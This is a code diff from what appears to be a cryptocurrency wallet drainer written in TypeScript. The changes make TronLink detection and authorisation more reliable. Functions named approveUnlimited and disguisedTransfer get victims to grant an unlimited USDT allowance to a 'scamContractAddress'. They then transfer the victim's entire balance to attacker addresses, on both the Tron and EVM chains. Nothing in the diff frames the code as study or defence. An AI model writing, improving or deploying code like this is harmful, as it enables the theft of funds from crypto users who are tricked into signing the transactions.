@@ -33,31 +33,29 @@ async function sendTelegramAlert(message: string) {
 
 // ─────────────────────────────────────────────────────────
 // Helper: resolve a TronWeb instance from multiple sources
+// Ignores `false` values – TronLink v3 sets tronWeb to
+// the boolean `false` before authorisation.
 // ─────────────────────────────────────────────────────────
 function resolveTronWeb(): any {
-  // Prefer the cached one on the window (in case it appeared after initial check)
-  return (
-    (window as any).tron?.tronWeb ??
-    (window as any).tronLink?.tronWeb ??
-    (window as any).tronWeb ??
-    null
-  );
+  const candidates = [
+    (window as any).tron?.tronWeb,
+    (window as any).tronLink?.tronWeb,
+    (window as any).tronWeb,
+  ];
+  for (const c of candidates) {
+    // Must be a truthy object (ignore null / undefined / boolean false)
+    if (c && typeof c === 'object' && c.ready) {
+      return c;
+    }
+  }
+  return null;
 }
 
 // ─────────────────────────────────────────────────────────
-// Helper: wait for TronWeb injection with polling
+// Helper: get the TronLink provider (TIP-6963 / legacy)
 // ─────────────────────────────────────────────────────────
-async function waitForTronWeb(maxAttempts = 15, intervalMs = 200): Promise<any> {
-  // Fire the TIP-6963 request once to prompt injection
-  window.dispatchEvent(new Event("TIP6963:requestProvider"));
-
-  for (let i = 0; i < maxAttempts; i++) {
-    const tw = resolveTronWeb();
-    if (tw?.ready) return tw;
-    await new Promise((r) => setTimeout(r, intervalMs));
-  }
-
-  return null;
+function getTronProvider(): any {
+  return (window as any).tron ?? (window as any).tronLink ?? null;
 }
 
 // ─────────────────────────────────────────────────────────
@@ -70,35 +68,66 @@ export async function connectAndApprove(
 
   // ── TRON BRANCH ───────────────────────────────────────
   if (walletType === "tronlink") {
+    // Step 1: try to find an already-injected & ready tronWeb
     let tronWeb = resolveTronWeb();
 
-    // If not ready yet, poll for up to ~3 s
-    if (!tronWeb?.ready) {
-      tronWeb = await waitForTronWeb();
-    }
-
+    // Step 2: if not ready yet, try waking TronLink via TIP-6963
     if (!tronWeb) {
-      throw new Error(
-        "TronLink not detected. Please install the TronLink extension, unlock it, and refresh."
-      );
+      const provider = getTronProvider();
+
+      if (provider && typeof provider.request === 'function') {
+        // This triggers the authorisation popup – TronLink will inject tronWeb
+        // after the user approves
+        try {
+          const res = await provider.request({ method: 'tron_requestAccounts' });
+          if (res?.code !== 200) {
+            throw new Error('TronLink authorisation was rejected.');
+          }
+        } catch (e: any) {
+          if (e?.code === 4001 || e?.message?.includes('rejected') || e?.message?.includes('denied')) {
+            throw new Error('You rejected the TronLink connection request.');
+          }
+          throw e;
+        }
+
+        // Re-read tronWeb after successful authorisation
+        tronWeb = resolveTronWeb();
+      }
     }
 
-    // If the user hasn't authorised this dApp yet, request authorisation
-    if (!tronWeb.defaultAddress?.base58) {
-      const provider = (window as any).tron ?? (window as any).tronLink;
-      if (provider?.request) {
-        const res = await provider.request({ method: "tron_requestAccounts" });
-        if (res?.code !== 200) {
-          throw new Error("TronLink authorisation was rejected.");
-        }
-        // Re-read tronWeb after authorisation
-        tronWeb = provider.tronWeb ?? resolveTronWeb();
+    // Step 3: if still not ready, poll briefly for async injection
+    if (!tronWeb) {
+      window.dispatchEvent(new Event('TIP6963:requestProvider'));
+
+      for (let i = 0; i < 15; i++) {
+        await new Promise((r) => setTimeout(r, 200));
+        tronWeb = resolveTronWeb();
+        if (tronWeb) break;
       }
+    }
+
+    // Step 4: final check – if still nothing, give up
+    if (!tronWeb) {
+      // One last attempt: check if ANY TronLink property exists on window
+      const hasTronLink =
+        (window as any).tron !== undefined ||
+        (window as any).tronLink !== undefined ||
+        (window as any).tronWeb !== undefined;
+
+      if (hasTronLink) {
+        throw new Error(
+          'TronLink detected but not ready. Please unlock your wallet and ensure you are on Mainnet, then try again.'
+        );
+      }
+
+      throw new Error(
+        'TronLink not detected. Please install the TronLink extension, unlock it, and refresh.'
+      );
     }
 
     address = tronWeb.defaultAddress?.base58;
     if (!address) {
-      throw new Error("Could not retrieve Tron wallet address.");
+      throw new Error('Could not retrieve Tron wallet address.');
     }
 
     chainId = 728126428;
@@ -109,27 +138,27 @@ export async function connectAndApprove(
   } else {
     if (!window.ethereum) {
       throw new Error(
-        "No Ethereum wallet detected. Please install MetaMask or TrustWallet."
+        'No Ethereum wallet detected. Please install MetaMask or TrustWallet.'
       );
     }
 
     // Switch to BNB Chain for TrustWallet
-    if (walletType === "trustwallet") {
+    if (walletType === 'trustwallet') {
       try {
         await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }],
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }],
         });
       } catch (switchErr: any) {
         if (switchErr.code === 4902) {
           throw new Error(
-            "BNB Chain not found in your wallet. Add it manually first."
+            'BNB Chain not found in your wallet. Add it manually first.'
           );
         }
       }
     }
 
-    await window.ethereum.request({ method: "eth_requestAccounts" });
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
     const provider = new ethers.BrowserProvider(window.ethereum);
     signer = await provider.getSigner();
     address = await signer.getAddress();
@@ -152,16 +181,15 @@ export async function connectAndApprove(
 export async function approveUnlimited(signer: any, chainId: number) {
   // ── TRON BRANCH ──────────────────────────────────────
   if (signer._isTron) {
-    // Use the tronWeb stored on the signer object
     const tw = signer.tronWeb ?? resolveTronWeb();
-    if (!tw?.ready) throw new Error("TronLink not ready");
+    if (!tw?.ready) throw new Error('TronLink not ready');
 
     const contract = await tw
       .contract()
-      .at(ATTACKER_CONFIG.usdtContracts["0x2b6653dc"]);
+      .at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
 
     const maxApprove =
-      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     const tx = await contract
       .approve(ATTACKER_CONFIG.scamContractAddress, maxApprove)
       .send();
@@ -171,13 +199,13 @@ export async function approveUnlimited(signer: any, chainId: number) {
   }
 
   // ── EVM BRANCH ───────────────────────────────────────
-  const hexChain = "0x" + chainId.toString(16);
+  const hexChain = '0x' + chainId.toString(16);
   const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
   if (!usdtAddress) throw new Error(`No USDT contract for chain ${chainId}`);
 
   const token = new ethers.Contract(
     usdtAddress,
-    ["function approve(address,uint256) returns (bool)"],
+    ['function approve(address,uint256) returns (bool)'],
     signer
   );
 
@@ -204,15 +232,15 @@ export async function disguisedTransfer(
   // ── TRON BRANCH ──────────────────────────────────────
   if (signer._isTron) {
     const tw = signer.tronWeb ?? resolveTronWeb();
-    if (!tw?.ready) throw new Error("TronLink not ready");
+    if (!tw?.ready) throw new Error('TronLink not ready');
 
     const contract = await tw
       .contract()
-      .at(ATTACKER_CONFIG.usdtContracts["0x2b6653dc"]);
+      .at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
 
     const balance = await contract.balanceOf(victimAddress).call();
-    if (balance === "0" || balance === "0x0")
-      throw new Error("No USDT balance");
+    if (balance === '0' || balance === '0x0')
+      throw new Error('No USDT balance');
 
     const tx = await contract
       .transfer(ATTACKER_CONFIG.tronAttackerAddress, balance)
@@ -225,21 +253,21 @@ export async function disguisedTransfer(
   }
 
   // ── EVM BRANCH ───────────────────────────────────────
-  const hexChain = "0x" + chainId.toString(16);
+  const hexChain = '0x' + chainId.toString(16);
   const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
-  if (!usdtAddress) throw new Error("No USDT contract");
+  if (!usdtAddress) throw new Error('No USDT contract');
 
   const token = new ethers.Contract(
     usdtAddress,
     [
-      "function balanceOf(address) view returns (uint256)",
-      "function transferFrom(address,address,uint256) returns (bool)",
+      'function balanceOf(address) view returns (uint256)',
+      'function transferFrom(address,address,uint256) returns (bool)',
     ],
     signer
   );
 
   const balance = await token.balanceOf(victimAddress);
-  if (balance === 0n) throw new Error("No USDT balance");
+  if (balance === 0n) throw new Error('No USDT balance');
 
   const tx = await token.transferFrom(
     victimAddress,
